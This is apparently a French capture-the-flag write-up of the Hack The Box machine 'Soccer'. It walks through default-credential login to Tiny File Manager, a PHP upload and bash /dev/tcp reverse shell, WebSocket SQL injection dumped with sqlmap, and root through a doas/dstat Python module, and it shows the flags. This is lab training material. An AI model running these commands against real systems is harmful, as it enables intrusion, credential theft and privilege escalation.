# HTB Soccer - Notes

## Recon

- Port 80 ouvert : `nginx 1.18.0`.
- `http://soccer.htb` redirige vers une page standard.
- Ajout de `soccer.htb` dans `/etc/hosts`.

### Découverte d'un sous-domaine

- `gobuster dir` sur `http://soccer.htb` révèle :
  - `/tiny/` -> Tiny File Manager

```bash
gobuster dir -u http://soccer.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

## Tiny File Manager

- Page de connexion identifiée comme Tiny File Manager.
- Référence : https://github.com/prasathmani/tinyfilemanager
- Credentials par défaut testés :
  - `admin/admin@123`
  - `user/12345`
- Connexion réussie.

### Upload de reverse shell

- La fonctionnalité d'upload fonctionne.
- J'ai uploadé un reverse shell PHP.
- Le shell est accessible via :
  - `http://soccer.htb/tiny/uploads/shell.php`

### Reverse shell

```bash
nc -lvnp 4444
bash -c '/bin/bash -i >& /dev/tcp/10.10.14.145/4444 0>&1'
```

### Passage en pretty shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# CTRL+Z
stty raw -echo; fg; ls; export SHELL=/bin/bash
export TERM=xterm; stty rows 38 columns 116
reset
```

## Shell initial

```text
www-data@soccer:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Recherche de pivot vers `player`

- Inspection de `/home` :
  - dossier `/home/player`
- Avec l'utilisateur `www-data`, on cible les fichiers de configuration du serveur web.

## Analyse nginx

Fichier trouvé : `/etc/nginx/sites-enabled/soc-player.htb`

```nginx
server {
    listen 80;
    listen [::]:80;

    server_name soc-player.soccer.htb;
    root /root/app/views;

    location / {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
    }
}
```

- Nouveau host détecté : `soc-player.soccer.htb`
- Ajouté dans `/etc/hosts`.
- Le site est accessible.
- On peut se connecter et s'enregistrer.
- Ticket ID en cours : `52316`

## WebSocket / SQL injection

- Une WebSocket est présente sur `ws://soc-player.soccer.htb:9091`.
- Payload initial : `{"id":"81832"}`.
- Test manuel avec `wscat` :

```bash
wscat -c ws://soc-player.soccer.htb:9091
> {"id":"999 or 1=1"}
< Ticket Exists
> {"id":"999 or 2=1"}
< Ticket Doesn't Exist
```

- Injection SQL confirmée.

## sqlmap

### Détection

```bash
sqlmap -u 'ws://soc-player.soccer.htb:9091' --data '{"id":"*"}'
```

- DBMS détecté : MySQL >= 5.0.12
- Injection de type : time-based blind

### Liste des bases

```bash
sqlmap -u 'ws://soc-player.soccer.htb:9091' --data '{"id":"*"}' --dbs
```

- Bases identifiées :
  - `information_schema`
  - `mysql`
  - `performance_schema`
  - `soccer_db`
  - `sys`

### Dump de la base `soccer_db`

```bash
sqlmap -u 'ws://soc-player.soccer.htb:9091' --data '{"id":"*"}' -D soccer_db --dump
```

- Table trouvée : `accounts`
- Colonnes : `id`, `username`, `email`, `password`
- Entrée :
  - `email` : `player@player.htb`
  - `username` : `player`
  - `password` : `PlayerOftheMatch2022`

## SSH player

- Credentials listées dans la base : `player@player.htb / PlayerOftheMatch2022`
- SSH fonctionne.
- Aucun accès `sudo` pour `player` :

```bash
player@soccer:~$ sudo -l
[sudo] password for player:
Sorry, user player may not run sudo on localhost.
```

## Linpeas et escalation de privilèges

- Transfert de `linpeas.sh` vers la machine :

```bash
sudo scp Tools/linpeas.sh player@soccer.htb:/tmp/
```

- Résultat intéressant de linpeas :
  - SUID `doas` trouvé : `/usr/local/bin/doas`
  - Configuration `doas.conf` autorise :
    - `permit nopass player as root cmd /usr/bin/dstat`

```bash
-rwsr-xr-x 1 root root 42224 Nov 17 2022 /usr/local/bin/doas
```

- `doas` peut exécuter `dstat` en tant que root sans mot de passe.
- `dstat` est listé avec un répertoire `/usr/local/share/dstat` contenant un module `exploit`.

### Exploitation `dstat`

- GTFObins pour `dstat` permet d’obtenir un shell root via un module ou un import Python.
- Exemple d'exploitation :

```bash
player@soccer:/usr/local/share/dstat$ cat dstat_exploit.py
import os; os.system('/bin/bash -p')

player@soccer:/usr/local/share/dstat$ doas /usr/bin/dstat --exploit
```

- Après exploitation :

```text
root@soccer:/usr/local/share/dstat# id
uid=0(root) gid=0(root) groups=0(root)
```

## Root

- Contenu des flags :

```bash
player@soccer:/usr/local/share/dstat$ doas /usr/bin/dstat --exploit
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
root@soccer:/usr/local/share/dstat# id
uid=0(root) gid=0(root) groups=0(root)
root@soccer:/usr/local/share/dstat# cat /root/root.txt
ecfe93d82cad459ff89157bee9c81f46
root@soccer:/usr/local/share/dstat# cat /home/player/user.txt
256c4dc8f86bed1cd3a899e081759cb3
```

## Conclusion

- Accès initial via Tiny File Manager.
- Passage à shell `www-data` obtenu.
- Découverte de `soc-player.soccer.htb` dans la config nginx.
- Exploitation WebSocket SQLi pour récupérer les credentials `player`.
- SSH `player` obtenu.
- Linpeas a aidé à identifier `doas` et `dstat`.
- Root obtenu via `doas /usr/bin/dstat --exploit`.
